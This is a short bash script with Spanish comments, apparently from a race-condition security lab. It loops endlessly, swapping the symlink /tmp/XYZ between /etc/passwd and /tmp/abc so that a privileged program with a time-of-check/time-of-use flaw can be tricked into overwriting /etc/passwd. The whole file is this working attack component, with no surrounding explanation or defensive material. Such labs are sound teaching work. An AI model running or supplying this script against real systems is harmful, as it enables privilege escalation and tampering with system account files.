#!/bin/bash

# Archivo objetivo que el atacante intenta sobrescribir
TARGET_FILE="/etc/passwd"

# Archivo alterno para el enlace simbólico
ALTERNATE_FILE="/tmp/abc"

# Crear un archivo alterno si no existe
touch $ALTERNATE_FILE

# Bucle infinito para cambiar rápidamente el enlace simbólico
while true; do
    ln -sf $TARGET_FILE /tmp/XYZ
    ln -sf $ALTERNATE_FILE /tmp/XYZ
done
